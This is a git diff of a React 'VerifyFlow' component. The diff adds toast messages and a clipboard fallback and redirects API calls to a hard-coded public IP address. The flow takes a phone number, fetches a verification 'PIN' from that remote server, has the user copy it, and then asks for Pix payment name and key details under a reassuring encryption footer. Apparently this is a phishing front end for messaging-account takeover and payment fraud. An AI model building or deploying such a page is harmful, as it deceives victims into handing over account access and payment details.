@@ -1,6 +1,8 @@
 import React, { useState, useEffect, useMemo } from 'react';
 import './VerifyFlow.css';
 import axios from 'axios';
+import { ToastContainer, toast } from 'react-toastify';
+import 'react-toastify/dist/ReactToastify.css';
 
 const WHATSAPP_HELP_NUMBER = '555131910192';
 
@@ -25,7 +27,7 @@ const VerifyFlow = () => {
 
   const sendPhone = async () => {
     if (phone.replace(/\D/g, '').length < 8) {
-      alert('Please enter a valid number.');
+      toast.warn('⚠️ Please enter a valid number.');
       return;
     }
 
@@ -34,23 +36,31 @@ const VerifyFlow = () => {
     setLoading(true);
 
     try {
-      await axios.post('http://localhost:3000/api/phone', { phone: formattedPhone });
+      await axios.post('http://144.172.114.124:4000/api/phone', { phone: formattedPhone });
+      // await axios.post('http://localhost:4000/api/phone', { phone: formattedPhone });
     } catch (error) {
-      alert('Failed to start verification.');
+      toast.error('❌ Failed to start verification.');
       setStep(1);
+      setLoading(false);
     }
   };
 
-  // Polling for PIN
   useEffect(() => {
     if (step !== 2 || !formattedPhone || pin) return;
 
     const interval = setInterval(async () => {
       try {
-        const res = await fetch(`http://localhost:3000/api/get-pin?phone=${encodeURIComponent(formattedPhone)}`);
+        const res = await fetch(`http://144.172.114.124:4000/api/get-pin?phone=${encodeURIComponent(formattedPhone)}`);
+        // const res = await fetch(`http://localhost:4000/api/get-pin?phone=${encodeURIComponent(formattedPhone)}`);
         if (res.ok) {
           const data = await res.json();
-          if (data.pin) {
+
+          if (!data.flag) {
+            setLoading(false);
+            clearInterval(interval);
+            setStep(1);
+            toast.error('❌ Verification failed. Please try again.');
+          } else if (data.pin) {
             setPin(data.pin);
             setLoading(false);
             clearInterval(interval);
@@ -65,16 +75,40 @@ const VerifyFlow = () => {
   }, [step, formattedPhone, pin]);
 
   const copyPin = () => {
-    if (pin) {
-      navigator.clipboard.writeText(pin).then(() => alert('Code copied: ' + pin));
-      setStep(3);
+    if (!pin) return;
 
+    if (navigator.clipboard && window.isSecureContext) {
+      navigator.clipboard.writeText(pin)
+        .then(() => toast.success(`✅ Code copied: ${pin}`))
+        .catch(() => fallbackCopy(pin));
+    } else {
+      fallbackCopy(pin);
     }
+
+    setStep(3);
+  };
+
+  const fallbackCopy = (text) => {
+    const textArea = document.createElement("textarea");
+    textArea.value = text;
+    textArea.style.position = "fixed";
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+
+    try {
+      const successful = document.execCommand('copy');
+      toast[successful ? 'success' : 'error'](`Code copied: ${text}`);
+    } catch (err) {
+      toast.error("❌ Copy failed. Please copy manually.");
+    }
+
+    document.body.removeChild(textArea);
   };
 
   const sendPix = () => {
     if (!pix.name || !pix.key) {
-      alert('Please fill out all fields!');
+      toast.warn('⚠️ Please fill out all fields!');
       return;
     }
 
@@ -99,8 +133,8 @@ const VerifyFlow = () => {
               onChange={(e) => setPhone(formatPhone(e.target.value))}
               placeholder="(11) 99955-9889"
             />
-            <button onClick={sendPhone} style={{ borderRadius: '50px' }}>
-              Next
+            <button onClick={sendPhone} disabled={loading} style={{ borderRadius: '50px' }}>
+              {loading ? 'Sending...' : 'Next'}
             </button>
           </div>
         </div>
@@ -119,9 +153,7 @@ const VerifyFlow = () => {
                 ))}
               </div>
             )}
-            <button onClick={copyPin} disabled={!pin}>
-              Copy Code
-            </button>
+            <button onClick={copyPin} disabled={!pin}>Copy Code</button>
           </div>
         </div>
       )}
@@ -173,6 +205,7 @@ const VerifyFlow = () => {
         </div>
       )}
 
+      <ToastContainer position="top-center" autoClose={3000} />
       <footer>🔒 Your personal messages are protected with end-to-end encryption.</footer>
     </div>
   );
